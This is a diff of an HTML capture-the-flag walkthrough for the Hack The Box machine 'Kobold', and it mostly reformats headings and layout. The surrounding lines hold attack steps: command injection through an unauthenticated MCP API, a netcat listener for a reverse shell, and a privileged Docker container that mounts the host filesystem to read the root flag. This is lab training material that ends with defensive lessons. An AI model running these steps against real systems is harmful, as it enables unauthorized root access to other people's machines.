@@ -37,15 +37,14 @@
 </head>
 <body>
 <div class="container">
-
-    <h1>🚀 HTB Kobold - Complete Walkthrough</h1>
-
     <div class="meta-info">
         <span><strong>Machine:</strong> Kobold</span>
-        <span><strong>Difficulty:</strong> 🟡 Medium</span>
-        <span><strong>OS:</strong> 🐧 Linux (Docker-based)</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>OS:</strong> Linux (Docker-based)</span>
         <span><strong>Domain:</strong> kobold.htb</span>
     </div>
+
+    <h1>🚀 HTB Kobold - Complete Walkthrough</h1>
 
     <h2>📋 Attack Chain Overview</h2>
     <div class="attack-chain">
@@ -64,13 +63,13 @@ Privileged Container Mount → Root Flag</pre>
 
     <h2>🔍 Reconnaissance</h2>
 
-    <h3>Add to /etc/hosts</h3>
+    <h3>Host Setup</h3>
     <pre><code>echo "TARGET_IP kobold.htb mcp.kobold.htb bin.kobold.htb" | sudo tee -a /etc/hosts</code></pre>
 
     <h3>Nmap Scan</h3>
     <pre><code>nmap -sC -sV -p- TARGET_IP</code></pre>
 
-    <h4>Key Findings:</h4>
+    <p>Key Findings:</p>
     <table>
         <tr><th>Port</th><th>Service</th><th>Details</th></tr>
         <tr><td>22/tcp</td><td>SSH</td><td>OpenSSH</td></tr>
@@ -82,7 +81,7 @@ Privileged Container Mount → Root Flag</pre>
     <h3>Virtual Host Discovery</h3>
     <pre><code>gobuster vhost -u https://kobold.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -k</code></pre>
 
-    <h4>Discovered Subdomains:</h4>
+    <p>Discovered Subdomains:</p>
     <ul>
         <li><code>mcp.kobold.htb</code> — MCP API endpoint</li>
         <li><code>bin.kobold.htb</code> — PrivateBin paste service</li>
@@ -96,6 +95,7 @@ Privileged Container Mount → Root Flag</pre>
   -d '{"serverConfig":{"command":"id","args":[],"env":{}},"serverId":"test"}'</code></pre>
 
     <h3>Reverse Shell Exploitation</h3>
+
     <div class="box warning">
         <strong>⚠️ Start listener first!</strong>
         <pre><code>nc -lvnp 4444</code></pre>
@@ -119,12 +119,15 @@ Privileged Container Mount → Root Flag</pre>
 # ben : ben operator docker</code></pre>
 
     <h3>Exploit Steps</h3>
-    <pre><code>newgrp docker
+    <pre><code>newgrp docker</code></pre>
 
-docker run --rm -it --privileged -v /:/hostfs --user root \
-  --entrypoint sh privatebin/nginx-fpm-alpine:2.0.2
+    <pre><code>docker run --rm -it --privileged -v /:/hostfs --user root \
+  --entrypoint sh privatebin/nginx-fpm-alpine:2.0.2</code></pre>
 
-# Inside container
+    <p>Inside the container:</p>
+    <pre><code>ls /hostfs/root/
+# root.txt
+
 cat /hostfs/root/root.txt</code></pre>
 
     <h3>One-Liner</h3>
@@ -132,23 +135,18 @@ cat /hostfs/root/root.txt</code></pre>
   --entrypoint sh privatebin/nginx-fpm-alpine:2.0.2 \
   -c "cat /hostfs/root/root.txt"</code></pre>
 
-    <h2>🏁 Root Flag</h2>
-    <pre><code># Root flag retrieved successfully.</code></pre>
-
     <h2>📊 Key Takeaways</h2>
     <ul>
-        <li><strong>Never trust user input in API endpoints</strong> — MCP API accepted arbitrary commands</li>
-        <li><strong>Docker group membership = root</strong> — Never add regular users to docker group</li>
-        <li><strong>Use rootless containers</strong> — Prevents this escalation path</li>
-        <li><strong>Network segmentation</strong> — MCP API should not be exposed without auth</li>
+        <li><strong>Never trust user input in API endpoints.</strong> MCP API accepted arbitrary commands without validation.</li>
+        <li><strong>Docker group membership = root.</strong> Never add regular users to the docker group.</li>
+        <li><strong>Use rootless containers.</strong> Prevents this escalation path.</li>
+        <li><strong>Network segmentation.</strong> The MCP API should not be exposed without authentication.</li>
     </ul>
 
     <div class="nav-buttons">
         <a href="/writeups.html" class="back"><i class="fas fa-arrow-left"></i> Back to Writeups</a>
     </div>
-
     <div class="footer">NIGHT PULSE X • 2026</div>
-
 </div>
 </body>
 </html>
